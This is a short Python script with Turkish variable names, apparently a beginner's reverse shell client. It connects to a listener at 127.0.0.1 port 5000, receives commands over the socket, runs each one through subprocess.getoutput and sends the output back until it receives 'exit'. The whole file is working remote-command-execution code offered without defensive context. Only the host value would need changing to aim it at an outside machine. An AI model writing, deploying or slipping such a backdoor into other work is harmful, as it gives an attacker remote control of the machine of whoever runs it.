import socket 
import subprocess
host ="127.0.0.1"
port = 5000
soket = socket.socket()
soket.connect((host,port))
mesaj = soket.recv(2048).decode()
print(mesaj)
while True:
	komut = soket.recv(2048).decode()
	if komut.lower() == "exit":
		break
	cıkti = subprocess.getoutput(komut)
	soket.send(cıkti.encode())
soket.close()
